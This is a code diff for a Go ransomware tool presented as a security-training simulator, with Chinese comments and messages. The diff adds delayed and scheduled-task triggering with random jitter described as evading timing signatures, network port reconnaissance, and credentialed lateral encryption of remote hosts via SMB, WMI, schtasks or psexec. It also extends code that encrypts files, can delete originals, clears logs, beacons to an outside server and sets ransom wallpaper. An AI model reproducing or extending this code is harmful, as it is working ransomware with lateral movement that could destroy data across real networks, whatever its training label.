@@ -23,6 +23,7 @@ import (
 	"path/filepath"
 	"regexp"
 	"runtime"
+	"sort"
 	"strings"
 	"sync"
 	"sync/atomic"
@@ -32,7 +33,7 @@ import (
 )
 
 const (
-	version   = "v3.6"
+	version   = "v3.7"
 	apiURL    = "https://encrypt.yangzifun.org/E56dSY"
 	beaconURL = "https://encrypt.yangzifun.org/beacon_check_in"
 
@@ -59,7 +60,7 @@ const ransomNoteContent = `
 1. 访问模拟恢复页面: https://encrypt.yangzifun.org/
 2. 输入您的唯一个人ID: %s
 
-本程序不会对原文件进行删除操作。如遇原文件丢失，可通过上方链接获取私钥及恢复程序。
+%s
 
 [!] 这是一次安全培训模拟演练 [!]
 
@@ -73,6 +74,20 @@ const ransomNoteContent = `
 此工具的创建旨在赋能防御者，而非赋能攻击者。请在法律和道德允许的范围内负责任地使用。
 
 `
+
+// 勒索信正文中的“源文件”提示段落（依据 -remove 选项二选一）
+const (
+	ransomNoteKeepNotice   = "本程序不会对原文件进行删除操作。如遇原文件丢失，可通过上方链接获取私钥及恢复程序。"
+	ransomNoteDeleteNotice = "本程序已删除原文件，仅保留加密后的文件；如需恢复，请通过上方链接获取私钥及恢复程序。"
+)
+
+// ransomNoteNotice 根据是否删除源文件返回对应的提示段落
+func ransomNoteNotice(removeOriginal bool) string {
+	if removeOriginal {
+		return ransomNoteDeleteNotice
+	}
+	return ransomNoteKeepNotice
+}
 
 //go:embed wallpaper.ps1
 var wallpaperScript string
@@ -225,6 +240,62 @@ type chunkInfo struct {
 	Size   int64
 }
 
+// options 汇总全部命令行参数（含定时触发 / 攻击面侦察 / 远程横向加密）
+type options struct {
+	workers         int
+	dryRun          bool
+	extensions      string
+	directory       string
+	removeOriginal  bool
+	logFlag         bool
+	stealthMode     bool
+	noStopServices  bool
+	noKillProcs     bool
+	noClearLogs     bool
+	aggressiveDelay int
+
+	// 定时触发
+	delay            time.Duration
+	atTime           string
+	randomDelay      time.Duration
+	persistSchedule  bool
+	scheduleTaskName string
+	scheduleCleanup  bool
+	scheduledRun     bool
+
+	// 模拟攻击扫描（攻击面侦察）
+	scan            bool
+	scanOnly        bool
+	scanTargets     string
+	scanTargetsFile string
+	scanPorts       string
+	scanWorkers     int
+	scanTimeout     time.Duration
+	scanICMP        bool
+
+	// 远程横向加密编排
+	remoteHosts     string
+	remoteHostsFile string
+	remoteAuto      bool
+	remoteUser      string
+	remotePass      string
+	remoteDomain    string
+	remoteKey       string
+	remotePort      int
+	remoteMethod    string
+	remoteStaging   string
+	remoteArgs      string
+	remoteConfirm   bool
+	remoteCleanup   bool
+}
+
+// remoteRequested 判断是否请求了远程横向加密
+func (o *options) remoteRequested() bool {
+	return strings.TrimSpace(o.remoteHosts) != "" ||
+		strings.TrimSpace(o.remoteHostsFile) != "" ||
+		o.remoteAuto
+}
+
 func main() {
 	forceReleaseLock()
 
@@ -247,25 +318,88 @@ func main() {
 	defer cleanupLockFile()
 
 	fs := flag.NewFlagSet("ransom_simulator", flag.ExitOnError)
-	workersFlag, dryRunFlag, extensionsFlag, directoryFlag, removeFlag, logFlag, stealthFlag, noStopSvcFlag, noKillFlag, noClearFlag, delayFlag := setupFlags(fs)
+	opt := setupFlags(fs)
 	if err := fs.Parse(os.Args[1:]); err != nil {
 		_, _ = fmt.Fprintf(os.Stderr, "错误: 解析命令行参数失败: %v\n", err)
 		os.Exit(1)
 	}
 
-	stealthMode = *stealthFlag
-	noStopServices = *noStopSvcFlag
-	noKillProcs = *noKillFlag
-	noClearLogs = *noClearFlag
-	aggressiveDelay = *delayFlag
+	stealthMode = opt.stealthMode
+	noStopServices = opt.noStopServices
+	noKillProcs = opt.noKillProcs
+	noClearLogs = opt.noClearLogs
+	aggressiveDelay = opt.aggressiveDelay
 
-	initLogging(*logFlag)
+	initLogging(opt.logFlag)
 	defer closeLogFiles()
 
-	showWarning(*dryRunFlag)
+	// 远程编排模式：指定了远程目标但未指定本地 -dir，则只做远程横向加密
+	remoteOnly := opt.remoteRequested() && strings.TrimSpace(opt.directory) == ""
+
+	// 计划任务唤起后的运行在结束时自动清理任务
+	if wasScheduledRun() && opt.scheduleCleanup {
+		defer cleanupPersistentSchedule(opt.scheduleTaskName)
+	}
+
+	// ---------- 阶段 0: 定时触发（--delay / --at / --random-delay / --persist-schedule）----------
+	if !wasScheduledRun() {
+		startAt, needWait, err := resolveStartTime(opt)
+		if err != nil {
+			fmt.Printf("[!] 定时参数错误: %v\n", err)
+			os.Exit(2)
+		}
+		if opt.persistSchedule {
+			if err := registerPersistentSchedule(opt, startAt); err != nil {
+				fmt.Printf("[!] 注册计划任务失败，回退为进程内等待: %v\n", err)
+			} else {
+				fmt.Println("[*] 计划任务已注册，当前进程退出；到点后由系统唤起并直接执行。")
+				if logEnabled {
+					logOperation("计划任务注册完成，主进程退出")
+				}
+				countdown("此终端将在", 5)
+				return
+			}
+		}
+		if needWait {
+			if !waitUntilStart(startAt, opt) {
+				return
+			}
+		}
+	}
+
+	if opt.scanOnly {
+		fmt.Println(">>> 已激活 [仅侦察模式]，不会执行任何加密或破坏性操作。")
+	} else {
+		showWarning(opt.dryRun)
+	}
+
+	// ---------- 阶段 1.5: 攻击面侦察（模拟攻击扫描）----------
+	var recon *reconReport
+	if opt.scan || opt.scanOnly || opt.remoteAuto {
+		recon = runRecon(opt)
+	}
+	if opt.scanOnly {
+		fmt.Println("\n================== [ 侦察完成 ] ==================")
+		if recon != nil {
+			fmt.Printf("  - 扫描目标:        %d\n", recon.Summary.Targets)
+			fmt.Printf("  - 存活主机:        %d\n", recon.Summary.AliveHosts)
+			fmt.Printf("  - 开放端口:        %d\n", recon.Summary.OpenPorts)
+			fmt.Printf("  - 高危主机:        %d\n", recon.Summary.HighRisk)
+			fmt.Printf("  - 可远程投递:      %d\n", recon.Summary.RemoteReady)
+		}
+		fmt.Println("[*] --scan-only 已启用: 不执行加密与破坏性操作。")
+		if logEnabled {
+			logOperation("--scan-only 模式结束（仅侦察）")
+		}
+		countdown("此终端将在", 10)
+		return
+	}
 	fmt.Println("\n[阶段 2: 防御规避与发现]")
-	if *dryRunFlag {
+	if opt.dryRun {
 		fmt.Println("[*] [演习模式] 跳过所有破坏性操作。")
+	} else if remoteOnly {
+		fmt.Println("[*] [远程编排模式] 跳过本地破坏性操作，仅执行远程横向加密。")
+		go networkBeacon()
 	} else {
 		go networkBeacon()
 
@@ -302,8 +436,8 @@ func main() {
 	}
 
 	extFilter := make(map[string]bool)
-	if *extensionsFlag != "" {
-		exts := strings.Split(*extensionsFlag, ",")
+	if opt.extensions != "" {
+		exts := strings.Split(opt.extensions, ",")
 		for _, ext := range exts {
 			ext = strings.TrimSpace(ext)
 			if ext != "" {
@@ -323,8 +457,8 @@ func main() {
 
 	var scanRoots []string
 	encryptAllFormats := false
-	if *directoryFlag != "" {
-		dirs := strings.Split(*directoryFlag, ",")
+	if opt.directory != "" {
+		dirs := strings.Split(opt.directory, ",")
 		for _, dir := range dirs {
 			dir = strings.TrimSpace(dir)
 			if dir != "" {
@@ -338,48 +472,108 @@ func main() {
 		}
 	}
 
-	fmt.Println("[*] 正在扫描文件系统以查找有价值的目标...")
-	filesToProcess := scanFiles(extFilter, scanRoots, encryptAllFormats)
-	if len(filesToProcess) == 0 {
-		fmt.Println("[!] 未找到任何有价值的目标文件。任务中止。")
-		os.Exit(0)
+	var filesToProcess []string
+	if remoteOnly {
+		fmt.Println("[*] 远程编排模式(-dir 未指定): 跳过本地文件扫描，仅执行远程横向加密。")
+	} else {
+		fmt.Println("[*] 正在扫描文件系统以查找有价值的目标...")
+		filesToProcess = scanFiles(extFilter, scanRoots, encryptAllFormats)
+		if len(filesToProcess) == 0 {
+			fmt.Println("[!] 未找到任何有价值的目标文件。")
+			if !opt.remoteRequested() {
+				fmt.Println("[!] 任务中止。")
+				os.Exit(0)
+			}
+		} else {
+			fmt.Printf("[+] 目标捕获完成。已识别 %d 个待加密文件。\n", len(filesToProcess))
+		}
 	}
-	fmt.Printf("[+] 目标捕获完成。已识别 %d 个待加密文件。\n", len(filesToProcess))
 
 	var stats counters
 	var finalUUID = "本地密钥模式"
-	if *dryRunFlag {
+	var publicKeyValue, publicKeyFilePath string
+
+	// 统一获取密钥：本地加密（非演习）与远程编排共用同一密钥，避免生成两份 UUID
+	if !opt.dryRun || opt.remoteRequested() {
+		uuid, pem, source, err := acquireKeys()
+		if err != nil {
+			fmt.Printf("[!] 获取密钥失败: %v\n", err)
+			remindLocalKey()
+			if !opt.dryRun {
+				// 保留窗口并给出可操作提示，避免双击运行时窗口一闪而过
+				countdown("此终端将在", 15)
+				os.Exit(1)
+			}
+		} else {
+			finalUUID = uuid
+			publicKeyValue = pem
+			fmt.Printf("[*] 当前密钥来源: %s\n", source)
+			if p, perr := ensureLocalPublicKeyFile(uuid, pem); perr != nil {
+				fmt.Printf("[!] %v\n", perr)
+			} else {
+				publicKeyFilePath = p
+			}
+		}
+	}
+
+	if opt.dryRun {
 		fmt.Println("\n[阶段 3: 载荷部署 (演习模式下跳过)]")
 		fmt.Println("[*] 以下文件在真实攻击中将被加密:")
 		for _, f := range filesToProcess {
 			fmt.Println("  -", f)
 		}
+	} else if len(filesToProcess) == 0 {
+		fmt.Println("\n[阶段 3: 载荷部署]")
+		fmt.Println("[*] 无本地目标文件，跳过本地加密。")
 	} else {
 		fmt.Println("\n[阶段 3: 载荷部署]")
-		fmt.Printf("[*] 初始化 %d 个加密线程。开始执行载荷...\n", *workersFlag)
-		runEncryptionWorkers(filesToProcess, *workersFlag, &stats, &finalUUID, *removeFlag)
+		fmt.Printf("[*] 初始化 %d 个加密线程。开始执行载荷...\n", opt.workers)
+		runEncryptionWorkers(filesToProcess, opt.workers, &stats, finalUUID, publicKeyValue, opt.removeOriginal)
 		fmt.Println("\n[+] 载荷执行完毕。")
 	}
 
-	if !*dryRunFlag {
+	if !opt.dryRun && !remoteOnly {
 		fmt.Println("\n[阶段 4: 勒索信增强]")
-		noteContent := fmt.Sprintf(ransomNoteContent, finalUUID)
+		noteContent := fmt.Sprintf(ransomNoteContent, finalUUID, ransomNoteNotice(opt.removeOriginal))
 		userProfile, err := os.UserHomeDir()
 		if err == nil {
 			desktopPath := filepath.Join(userProfile, "Desktop")
 			_ = os.WriteFile(filepath.Join(desktopPath, ransomNoteFileName), []byte(noteContent), 0644)
 		}
-		createRansomWallpaper(finalUUID)
+		createRansomWallpaper(finalUUID, opt.removeOriginal)
+	} else if remoteOnly {
+		fmt.Println("\n[阶段 4: 勒索信增强]")
+		fmt.Println("[*] [远程编排模式] 跳过本地勒索信投放与桌面壁纸篡改。")
+	}
+
+	// ---------- 阶段 5: 远程横向加密编排 ----------
+	var remoteRep *remoteReport
+	if opt.remoteRequested() {
+		remoteRep = runRemoteEncryption(opt, recon, publicKeyFilePath)
 	}
 
 	fmt.Println("\n================== [ 任务完成 ] ==================")
-	if *dryRunFlag {
+	if opt.dryRun {
 		fmt.Printf("  - 模式:            演习模式 (Dry Run)\n")
 		fmt.Printf("  - 发现目标:        %d\n", len(filesToProcess))
 	} else {
 		fmt.Printf("  - 模式:            实时攻击\n")
 		fmt.Printf("  - 已加密文件:      %d\n", stats.success.Load())
 		fmt.Printf("  - 加密失败:        %d\n", stats.failed.Load())
+	}
+	if recon != nil {
+		fmt.Printf("  - 侦察结果:        存活 %d / 目标 %d, 开放端口 %d, 高危主机 %d, 可远程投递 %d\n",
+			recon.Summary.AliveHosts, recon.Summary.Targets, recon.Summary.OpenPorts,
+			recon.Summary.HighRisk, recon.Summary.RemoteReady)
+	}
+	if opt.persistSchedule && !wasScheduledRun() {
+		fmt.Printf("  - 计划任务:        %s\n", opt.scheduleTaskName)
+	}
+	if remoteRep != nil {
+		fmt.Printf("  - 远程编排:        目标 %d 台, 模式 %s\n", len(remoteRep.Results), modeLabel(remoteRep.Mode))
+		if remoteRep.JSONFile != "" {
+			fmt.Printf("  - 远程报告:        %s\n", remoteRep.JSONFile)
+		}
 	}
 
 	// 输出日志文件位置
@@ -407,33 +601,28 @@ func initProgramDir() {
 	}
 }
 
-// 从公钥文件名中提取UUID
-func extractUUIDFromFilename() (string, error) {
-	// 扫描程序目录中的文件，查找公钥文件
-	files, err := os.ReadDir(programDir)
+// publicKeyFilePattern 严格公钥文件名：public_key_<uuid>.pem
+var publicKeyFilePattern = regexp.MustCompile(`^public_key_([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})\.pem$`)
+
+// uuidFromKeyFileName 从公钥文件名提取 UUID；文件名不含合法 UUID 时返回空串。
+func uuidFromKeyFileName(name string) string {
+	if m := publicKeyFilePattern.FindStringSubmatch(name); m != nil && len(m) == 2 && isValidUUID(m[1]) {
+		return m[1]
+	}
+	return ""
+}
+
+// uuidFromPublicKey 依据公钥指纹生成稳定 UUID（RFC 4122 v4 形式）。
+// 用于文件名不含 UUID 的本地公钥，保证同一把公钥每次运行得到同一个 ID。
+func uuidFromPublicKey(pub *rsa.PublicKey) string {
+	der, err := x509.MarshalPKIXPublicKey(pub)
 	if err != nil {
-		return "", fmt.Errorf("无法读取程序目录: %w", err)
+		return "本地密钥模式"
 	}
-
-	// 正则表达式匹配公钥文件名格式
-	pattern := regexp.MustCompile(`^public_key_([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})\.pem$`)
-
-	for _, file := range files {
-		if file.IsDir() {
-			continue
-		}
-
-		matches := pattern.FindStringSubmatch(file.Name())
-		if matches != nil && len(matches) == 2 {
-			uuid := matches[1]
-			if isValidUUID(uuid) {
-				fmt.Printf("[*] 从文件名提取UUID: %s\n", uuid)
-				return uuid, nil
-			}
-		}
-	}
-
-	return "", fmt.Errorf("未找到有效的公钥文件。请确保程序目录中存在公钥文件，格式为: public_key_<uuid>.pem")
+	sum := sha256.Sum256(der)
+	sum[6] = (sum[6] & 0x0f) | 0x40
+	sum[8] = (sum[8] & 0x3f) | 0x80
+	return fmt.Sprintf("%x-%x-%x-%x-%x", sum[0:4], sum[4:6], sum[6:8], sum[8:10], sum[10:16])
 }
 
 // 验证UUID格式
@@ -464,54 +653,156 @@ func isValidUUID(uuid string) bool {
 	return true
 }
 
-// 从本地PEM文件读取公钥
-func readPublicKeyFromFile(uuid string) (string, error) {
-	// 构造文件名
-	fileName := fmt.Sprintf("public_key_%s.pem", uuid)
-	filePath := filepath.Join(programDir, fileName)
-
-	// 检查文件是否存在
-	if _, err := os.Stat(filePath); os.IsNotExist(err) {
-		return "", fmt.Errorf("公钥文件不存在: %s", filePath)
+// parseRSAPublicKey 解析 PEM 编码的 RSA 公钥（PKIX 或 PKCS#1）。
+func parseRSAPublicKey(content []byte) (*rsa.PublicKey, error) {
+	block, _ := pem.Decode(content)
+	if block == nil {
+		return nil, fmt.Errorf("无效的 PEM 格式")
 	}
-
-	// 读取文件内容
-	content, err := os.ReadFile(filePath)
-	if err != nil {
-		return "", fmt.Errorf("读取公钥文件失败: %w", err)
+	if block.Type != "PUBLIC KEY" && block.Type != "RSA PUBLIC KEY" {
+		return nil, fmt.Errorf("PEM 类型应为 PUBLIC KEY / RSA PUBLIC KEY，实际为 %q", block.Type)
 	}
-
-	// 验证PEM格式
-	pemBlock, _ := pem.Decode(content)
-	if pemBlock == nil {
-		return "", fmt.Errorf("无效的PEM格式: %s", filePath)
+	pkixPub, pkixErr := x509.ParsePKIXPublicKey(block.Bytes)
+	if pkixErr == nil {
+		pub, ok := pkixPub.(*rsa.PublicKey)
+		if !ok {
+			return nil, fmt.Errorf("公钥不是 RSA 类型")
+		}
+		return pub, nil
 	}
-
-	// 验证公钥类型
-	if pemBlock.Type != "PUBLIC KEY" && pemBlock.Type != "RSA PUBLIC KEY" {
-		return "", fmt.Errorf("不是有效的公钥文件: 类型应为 'PUBLIC KEY' 或 'RSA PUBLIC KEY'，实际为 '%s'", pemBlock.Type)
+	if pkcs1Pub, pkcs1Err := x509.ParsePKCS1PublicKey(block.Bytes); pkcs1Err == nil {
+		return pkcs1Pub, nil
 	}
+	return nil, fmt.Errorf("公钥解析失败: %v", pkixErr)
+}
 
-	// 尝试解析以验证有效性
-	pub, err := x509.ParsePKIXPublicKey(pemBlock.Bytes)
-	if err != nil {
-		// 尝试PKCS1格式
-		pub, err = x509.ParsePKCS1PublicKey(pemBlock.Bytes)
-		if err != nil {
-			return "", fmt.Errorf("解析公钥失败: %w", err)
+// keySearchDirs 返回本地公钥的查找目录：程序目录优先，其次当前工作目录，
+// 最后是用户级密钥缓存目录。
+func keySearchDirs() []string {
+	dirs := []string{programDir}
+	add := func(dir string) {
+		if strings.TrimSpace(dir) == "" {
+			return
+		}
+		for _, existing := range dirs {
+			if strings.EqualFold(existing, dir) {
+				return
+			}
+		}
+		dirs = append(dirs, dir)
+	}
+	if wd, err := os.Getwd(); err == nil {
+		add(wd)
+	}
+	add(keyCacheDir())
+	return dirs
+}
+
+// keyCacheDir 保存联网成功后下发的公钥副本，供程序目录不可写时断网回退。
+func keyCacheDir() string {
+	base, err := os.UserConfigDir()
+	if err != nil || strings.TrimSpace(base) == "" {
+		return ""
+	}
+	return filepath.Join(base, "RansomSimulator", "keys")
+}
+
+// cachePublicKeyCopy 把 API 下发的公钥副本落到用户级缓存目录（失败仅忽略），
+// 保证程序目录只读时，下一次断网运行仍能回退到本地密钥。
+func cachePublicKeyCopy(uuid, pemText string) {
+	dir := keyCacheDir()
+	if dir == "" || strings.TrimSpace(uuid) == "" {
+		return
+	}
+	if err := os.MkdirAll(dir, 0700); err != nil {
+		return
+	}
+	_ = os.WriteFile(filepath.Join(dir, fmt.Sprintf("public_key_%s.pem", uuid)), []byte(pemText), 0600)
+}
+
+// loadLocalKey 从本机查找可用的 RSA 公钥文件。
+// 程序目录优先；兼容 public_key_<uuid>.pem 以及 public_key.pem、任意 *.pem 文件名。
+// 文件名不含 UUID 时按公钥指纹生成稳定 UUID。
+func loadLocalKey() (uuid, pemText, filePath string, err error) {
+	var reasons []string
+	for _, dir := range keySearchDirs() {
+		entries, readErr := os.ReadDir(dir)
+		if readErr != nil {
+			if !os.IsNotExist(readErr) {
+				reasons = append(reasons, fmt.Sprintf("无法读取目录 %s: %v", dir, readErr))
+			}
+			continue
+		}
+
+		type candidate struct {
+			name string
+			rank int
+		}
+		var cands []candidate
+		for _, entry := range entries {
+			if entry.IsDir() {
+				continue
+			}
+			name := entry.Name()
+			lower := strings.ToLower(name)
+			if !strings.HasSuffix(lower, ".pem") {
+				continue
+			}
+			rank := 3 // 任意 .pem
+			if publicKeyFilePattern.MatchString(name) {
+				rank = 1 // public_key_<uuid>.pem
+			} else if strings.HasPrefix(lower, "public_key") {
+				rank = 2 // public_key.pem / public_key_xxx.pem
+			}
+			cands = append(cands, candidate{name: name, rank: rank})
+		}
+		sort.SliceStable(cands, func(i, j int) bool {
+			if cands[i].rank != cands[j].rank {
+				return cands[i].rank < cands[j].rank
+			}
+			return cands[i].name < cands[j].name
+		})
+
+		for _, c := range cands {
+			full := filepath.Join(dir, c.name)
+			content, readErr := os.ReadFile(full)
+			if readErr != nil {
+				reasons = append(reasons, fmt.Sprintf("读取 %s 失败: %v", full, readErr))
+				continue
+			}
+			pub, parseErr := parseRSAPublicKey(content)
+			if parseErr != nil {
+				reasons = append(reasons, fmt.Sprintf("%s 不是可用公钥: %v", c.name, parseErr))
+				continue
+			}
+			id := uuidFromKeyFileName(c.name)
+			if id == "" {
+				id = uuidFromPublicKey(pub)
+			}
+			return id, string(content), full, nil
 		}
 	}
 
-	_, ok := pub.(*rsa.PublicKey)
-	if !ok {
-		return "", fmt.Errorf("公钥不是RSA类型")
+	msg := fmt.Sprintf("程序目录 %s 下未找到可用公钥（期望 public_key_<uuid>.pem，也兼容 public_key.pem 等 *.pem）", programDir)
+	if len(reasons) > 0 {
+		msg += "；" + strings.Join(reasons, "；")
 	}
+	return "", "", "", fmt.Errorf("%s", msg)
+}
 
-	if logEnabled {
-		logOperation(fmt.Sprintf("从本地文件读取公钥: %s", filePath))
-	}
-
-	return string(content), nil
+// remindLocalKey 在完全找不到密钥时给出可操作提示（由调用方负责停留窗口）。
+func remindLocalKey() {
+	fmt.Println()
+	fmt.Println("==================================================")
+	fmt.Println("[!] 无法获取加密密钥，任务已中止")
+	fmt.Println("==================================================")
+	fmt.Println("[*] 处理方式:")
+	fmt.Println("    1. 断网环境: 把公钥文件放到程序目录，文件名形如 public_key_<uuid>.pem")
+	fmt.Printf("       程序目录: %s\n", programDir)
+	fmt.Println("       （也兼容 public_key.pem 等任意 *.pem 公钥文件）")
+	fmt.Println("    2. 有网络:   检查网络/代理后重新运行，联网成功后会自动在本地缓存公钥")
+	fmt.Println("==================================================")
+	fmt.Println()
 }
 
 // 初始化日志系统
@@ -853,18 +1144,54 @@ func cleanupLockFile() {
 	}
 }
 
-func setupFlags(fs *flag.FlagSet) (*int, *bool, *string, *string, *bool, *bool, *bool, *bool, *bool, *bool, *int) {
-	workers := fs.Int("workers", runtime.NumCPU(), "并发 worker 数量")
-	dryRun := fs.Bool("dry-run", false, "演习模式")
-	extensions := fs.String("ext", "", "指定要加密的文件扩展名 (e.g., '.txt,.pdf')")
-	directory := fs.String("dir", "", "指定目标 (目录或单个文件); 将忽略扩展名限制")
-	removeOriginal := fs.Bool("remove", false, "加密后删除原文件")
-	logFlag := fs.Bool("log", false, "启用日志功能，在程序所在目录输出日志文件")
-	stealthFlag := fs.Bool("stealth-mode", false, "隐身模式：执行额外清理操作")
-	noStopSvcFlag := fs.Bool("no-stop-services", false, "跳过停止服务操作")
-	noKillFlag := fs.Bool("no-kill-procs", false, "跳过终止进程操作")
-	noClearFlag := fs.Bool("no-clear-logs", false, "跳过清除日志操作")
-	delayFlag := fs.Int("aggressive-delay", 0, "操作间随机延迟上限（毫秒），0=无延迟")
+func setupFlags(fs *flag.FlagSet) *options {
+	opt := &options{}
+
+	fs.IntVar(&opt.workers, "workers", runtime.NumCPU(), "并发 worker 数量")
+	fs.BoolVar(&opt.dryRun, "dry-run", false, "演习模式")
+	fs.StringVar(&opt.extensions, "ext", "", "指定要加密的文件扩展名 (e.g., '.txt,.pdf')")
+	fs.StringVar(&opt.directory, "dir", "", "指定目标 (目录或单个文件); 将忽略扩展名限制")
+	fs.BoolVar(&opt.removeOriginal, "remove", false, "加密后删除原文件")
+	fs.BoolVar(&opt.logFlag, "log", false, "启用日志功能，在程序所在目录输出日志文件")
+	fs.BoolVar(&opt.stealthMode, "stealth-mode", false, "隐身模式：执行额外清理操作")
+	fs.BoolVar(&opt.noStopServices, "no-stop-services", false, "跳过停止服务操作")
+	fs.BoolVar(&opt.noKillProcs, "no-kill-procs", false, "跳过终止进程操作")
+	fs.BoolVar(&opt.noClearLogs, "no-clear-logs", false, "跳过清除日志操作")
+	fs.IntVar(&opt.aggressiveDelay, "aggressive-delay", 0, "操作间随机延迟上限（毫秒），0=无延迟")
+
+	// ---- 定时触发 ----
+	fs.DurationVar(&opt.delay, "delay", 0, "启动前等待时长（如 30s/5m/2h），0=不等待")
+	fs.StringVar(&opt.atTime, "at", "", "定时启动时刻（2006-01-02 15:04:05 / 15:04 / RFC3339，15:04 已过则顺延次日）")
+	fs.DurationVar(&opt.randomDelay, "random-delay", 0, "在定时基础上叠加 0~X 的随机抖动，规避固定时序特征")
+	fs.BoolVar(&opt.persistSchedule, "persist-schedule", false, "把定时注册为系统计划任务（schtasks），程序退出后到点由系统唤起")
+	fs.StringVar(&opt.scheduleTaskName, "schedule-task-name", "RansomSimTask", "计划任务名称")
+	fs.BoolVar(&opt.scheduleCleanup, "schedule-cleanup", true, "计划任务唤起执行结束后自动删除任务")
+	fs.BoolVar(&opt.scheduledRun, "scheduled-run", false, "内部标记：由计划任务唤起（注册任务时自动添加，无需手动指定）")
+
+	// ---- 模拟攻击扫描（攻击面侦察）----
+	fs.BoolVar(&opt.scan, "scan", false, "启用攻击面侦察（本地网段/指定目标的 TCP 端口发现）")
+	fs.BoolVar(&opt.scanOnly, "scan-only", false, "仅执行侦察并输出报告，不加密文件、不执行破坏性操作")
+	fs.StringVar(&opt.scanTargets, "scan-targets", "", "侦察目标（逗号分隔的 IP/CIDR/主机名，auto=自动使用本机网段）")
+	fs.StringVar(&opt.scanTargetsFile, "scan-targets-file", "", "侦察目标清单文件（每行一个目标，# 开头为注释）")
+	fs.StringVar(&opt.scanPorts, "scan-ports", "", "侦察端口列表（逗号分隔），默认内置常见企业服务端口")
+	fs.IntVar(&opt.scanWorkers, "scan-workers", 128, "侦察并发数")
+	fs.DurationVar(&opt.scanTimeout, "scan-timeout", 800*time.Millisecond, "单端口探测超时")
+	fs.BoolVar(&opt.scanICMP, "scan-icmp", false, "先用 ping 探活再扫端口")
+
+	// ---- 远程横向加密编排 ----
+	fs.StringVar(&opt.remoteHosts, "remote-hosts", "", "远程目标（逗号分隔，支持 user@host、host:port）")
+	fs.StringVar(&opt.remoteHostsFile, "remote-hosts-file", "", "远程目标清单文件（每行一个目标，# 开头为注释）")
+	fs.BoolVar(&opt.remoteAuto, "remote-auto", false, "使用侦察结果中开放 SMB/SSH/WinRM 的主机作为远程目标（配合 --scan）")
+	fs.StringVar(&opt.remoteUser, "remote-user", "", "远程认证用户名")
+	fs.StringVar(&opt.remotePass, "remote-pass", "", "远程认证口令")
+	fs.StringVar(&opt.remoteDomain, "remote-domain", "", "远程认证域（Domain\\user）")
+	fs.StringVar(&opt.remoteKey, "remote-key", "", "SSH 私钥路径（仅 ssh 通道使用，Windows SMB/WMI 通道忽略）")
+	fs.IntVar(&opt.remotePort, "remote-port", 0, "远程目标端口（默认 445，ssh 通道为 22）")
+	fs.StringVar(&opt.remoteMethod, "remote-method", "auto", "远程通道: auto|smb|wmi|schtasks|psexec（smb=仅投递）")
+	fs.StringVar(&opt.remoteStaging, "remote-staging", defaultRemoteStaging, "远端暂存目录（需为本地风格路径，如 C:\\ProgramData\\RsSim）")
+	fs.StringVar(&opt.remoteArgs, "remote-args", "", "透传给远端 encryptor 的额外参数（如 \"-workers 8 -ext .docx\"）")
+	fs.BoolVar(&opt.remoteConfirm, "remote-confirm", false, "确认真实执行远端加密（缺省仅做连通性+投递演练，远端以 -dry-run 运行）")
+	fs.BoolVar(&opt.remoteCleanup, "remote-cleanup", false, "远程执行结束后清理远端暂存目录")
 
 	fs.Usage = func() {
 		_, _ = fmt.Fprintf(os.Stderr, "用法: %s [flags]\n", os.Args[0])
@@ -882,9 +1209,19 @@ func setupFlags(fs *flag.FlagSet) (*int, *bool, *string, *string, *bool, *bool, 
 		_, _ = fmt.Fprintf(os.Stderr, "  - --no-kill-procs:      跳过终止占用文件的进程\n")
 		_, _ = fmt.Fprintf(os.Stderr, "  - --no-clear-logs:      跳过清除备份和日志文件\n")
 		_, _ = fmt.Fprintf(os.Stderr, "  - --aggressive-delay:   操作间随机延迟上限（毫秒）\n")
+		_, _ = fmt.Fprintf(os.Stderr, "定时触发:\n")
+		_, _ = fmt.Fprintf(os.Stderr, "  - --delay / --at / --random-delay: 定时启动\n")
+		_, _ = fmt.Fprintf(os.Stderr, "  - --persist-schedule:   注册系统计划任务（schtasks），退出后到点唤起\n")
+		_, _ = fmt.Fprintf(os.Stderr, "模拟攻击扫描:\n")
+		_, _ = fmt.Fprintf(os.Stderr, "  - --scan / --scan-only: 攻击面侦察（端口发现 + 本机资产 + 报告）\n")
+		_, _ = fmt.Fprintf(os.Stderr, "  - --scan-targets / --scan-targets-file: 侦察目标\n")
+		_, _ = fmt.Fprintf(os.Stderr, "远程横向加密:\n")
+		_, _ = fmt.Fprintf(os.Stderr, "  - --remote-hosts / --remote-hosts-file / --remote-auto: 远程目标\n")
+		_, _ = fmt.Fprintf(os.Stderr, "  - --remote-method:      auto|smb|wmi|schtasks|psexec（smb=仅投递）\n")
+		_, _ = fmt.Fprintf(os.Stderr, "  - --remote-confirm:     确认真实执行远端加密（缺省仅投递+演练）\n")
 		fs.PrintDefaults()
 	}
-	return workers, dryRun, extensions, directory, removeOriginal, logFlag, stealthFlag, noStopSvcFlag, noKillFlag, noClearFlag, delayFlag
+	return opt
 }
 
 func showWarning(dryRun bool) {
@@ -1016,11 +1353,20 @@ func readDesktopWallpaperReg() (string, error) {
 }
 
 // createRansomWallpaper 生成勒索提示壁纸并设置为当前用户桌面壁纸
-func createRansomWallpaper(uuid string) {
+// removeOriginal 为 true 时壁纸会额外显示“源文件已被删除”的提示
+func createRansomWallpaper(uuid string, removeOriginal bool) {
 	fmt.Println("[*] 生成并设置勒索提示壁纸...")
 
 	if logEnabled {
-		logOperation("开始生成勒索提示壁纸")
+		logOperation(fmt.Sprintf("开始生成勒索提示壁纸 (删除源文件: %v)", removeOriginal))
+	}
+
+	// 记录原始壁纸路径，便于事后还原（参见 readme 的“如何还原”说明）
+	if original, err := readDesktopWallpaperReg(); err == nil && strings.TrimSpace(original) != "" {
+		fmt.Printf("[i] 原始桌面壁纸: %s\n", original)
+		if logEnabled {
+			logOperation("原始桌面壁纸: " + original)
+		}
 	}
 
 	// 优先输出到程序所在目录，不可用时回退到用户桌面
@@ -1032,10 +1378,13 @@ func createRansomWallpaper(uuid string) {
 	}
 
 	// 使用内嵌脚本生成图片：直接调用 powershell，避免 cmd /C 的参数转义问题
-	script := fmt.Sprintf("& {%s} -OutPath '%s' -Uuid '%s'",
+	// -Ver 控制品牌版本号，-Remove 控制是否显示“源文件已被删除”提示
+	script := fmt.Sprintf("& {%s} -OutPath '%s' -Uuid '%s' -Ver '%s' -Remove '%t'",
 		strings.TrimSpace(wallpaperScript),
 		strings.ReplaceAll(outPath, "'", "''"),
-		strings.ReplaceAll(uuid, "'", "''"))
